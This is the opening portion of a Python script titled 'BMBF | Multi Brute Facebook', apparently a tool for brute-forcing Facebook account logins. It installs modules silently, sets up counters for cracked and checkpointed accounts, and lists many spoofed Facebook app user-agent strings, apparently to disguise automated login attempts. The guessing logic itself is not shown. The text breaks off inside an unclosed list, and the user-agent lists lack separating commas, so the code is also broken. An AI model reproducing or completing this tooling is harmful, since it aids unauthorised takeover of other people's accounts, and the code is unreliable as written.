import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
#------------------[  MODULE  ]-------------------#
try:
    import licensing
except ImportError:
    print('• Sedang Menginstall Modul licensing •')
    os.system('pip install licensing')
try:
        import rich
except ImportError:
        print('• Sedang Menginstall Modul Rich •')
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        print('• Sedang Menginstall Modul stdiomask •')
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('• Sedang Menginstall Modul requests •')
	os.system('pip install requests && pip install mechanize ')
#------------------[ IMPORT MODULE ]-------------------#
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from licensing.models import *
from licensing.methods import Key, Helpers

#------------------[ GLOBAL NAME ]-------------------#
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
uidl =[]
opsi=[]
uidf=[]
liu=[]
licenseKey=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; BMBF | Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#

jai = random.choice(
	[
		"Mozilla/5.0 (Linux; Android 13; SM-A325F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76;]"
		"Mozilla/5.0 (Linux; Android 11; 22011119UY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.29.105;]"
		"Mozilla/5.0 (Linux; Android 9; SM-A405FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]"
		"Mozilla/5.0 (Linux; Android 9; LM-X430 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; Lenovo TB-J607Z Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 9; SM-J415G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/347.0.0.17.97;]"
		"Mozilla/5.0 (Linux; Android 12; CPH2307 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]"
		"Mozilla/5.0 (Linux; Android 11; SM-A315G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 8.1.0; CLT-L29 Build/HUAWEICLT-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 13; SM-M336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 13; SM-X800 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]"
		"Mozilla/5.0 (Linux; Android 12; moto g31 Build/S3RWBS32.125-29-2-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/347.0.0.17.97;]"
		"Mozilla/5.0 (Linux; Android 9; BV9800Pro Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; M2101K7BNY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 8.0.0; SM-A600FN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 10; LM-X430 Build/QKQ1.200730.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; KB2003 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 13; M2101K6G Build/TKQ1.221013.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]"
		"Mozilla/5.0 (Linux; Android 10; SM-A013M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/346.0.0.8.76;]"
		"Mozilla/5.0 (Linux; Android 9; Mi A2 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro Build/TQ2A.230305.008.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 9; moto e6s Build/POBS29.288-46-6-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606X Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 10; SM-J400M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;] [ip:46.190.9.221]"
		"Mozilla/5.0 (Linux; Android 10; MAR-LX1B Build/HUAWEIMAR-L21B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
		"Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro Build/TQ1A.230205.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 10; LYA-L09 Build/HUAWEILYA-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; moto e20 Build/RON31.267-38; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/346.0.0.8.76;]"
		"Mozilla/5.0 (Linux; Android 10; SM-J810M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]"
		"Mozilla/5.0 (Linux; Android 11; T775H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; SM-A225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; W-V755-EEA Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 13; SM-A226BR Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 10; HMA-L29 Build/HUAWEIHMA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 9; ASUS_X00QD Build/PPR1.180610.009; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 10; YAL-L41 Build/HUAWEIYAL-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]"
		"Mozilla/5.0 (Linux; Android 12; SM-A135M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; SM-A336B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 13; SM-G781V Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]"
		"Mozilla/5.0 (Linux; Android 13; SM-A037M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 10; EML-L09 Build/HUAWEIEML-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.113 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]"
		"Mozilla/5.0 (Linux; Android 8.1.0; SM-G610M Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]"
		"Mozilla/5.0 (Linux; Android 10; M2002J9G Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; SM-A505F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.72 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]"
		"Mozilla/5.0 (Linux; Android 7.0; SM-J701MT Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; T782H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]"
		"Mozilla/5.0 (Linux; Android 12; M2007J3SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.29 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; 2201117SY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 9; SM-A105M Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; SM-A525F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; Mi Note 10 Lite Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; SM-A526B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]"
		"Mozilla/5.0 (Linux; Android 9; SM-J730G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 7.0; SM-T815 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]"
		"Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]"
		"Mozilla/5.0 (Linux; Android 13; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]"
		"Mozilla/5.0 (Linux; Android 10; SM-A920F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; CPH2021 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; SM-M127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; Tab 13 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 5.1.1; SM-G925F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]"
		"Mozilla/5.0 (Linux; Android 10; POT-LX1 Build/HUAWEIPOT-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 10; LM-X520 Build/QKQ1.200531.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]"
		"Mozilla/5.0 (Linux; Android 11; CMA-LX1 Build/HONORCMA-L41CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]"
		"Mozilla/5.0 (Linux; Android 9; TA-1020 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; Mi 9 Lite Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 10; LM-X540 Build/QKQ1.200730.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; 6165H Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; SM-G977B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 8.0.0; LG-H850 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; 2201117SY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]"
		"Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]"
		"Mozilla/5.0 (Linux; Android 12; CPH2271 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76;]"
		"Mozilla/5.0 (Linux; Android 11; T774H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 11; moto g31 Build/RRWBS31.Q3-46-85-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/406.0.0.29.88;FBBV/456205248;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/457697490]"
		"Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; 2201116TG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJS30.506-14-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; SM-A336B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (Linux; Android 12; NTH-NX9 Build/HONORNTH-N29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
	]
)
jai2 = random.choice(
	[
		"Mozilla/5.0 (Linux; Android 10; PCS02 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D47 [FBAN/FBPageAdmin;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3;FBSS/3;FBID/phone;FBLC/da_DK;FBOP/5;FBDI/BE9904C1-02F3-4FF4-A216-0D0186BE28CA]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBPageAdmin;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/8C4F700B-C842-4EA5-AE9D-D6CF8C6E4411]"
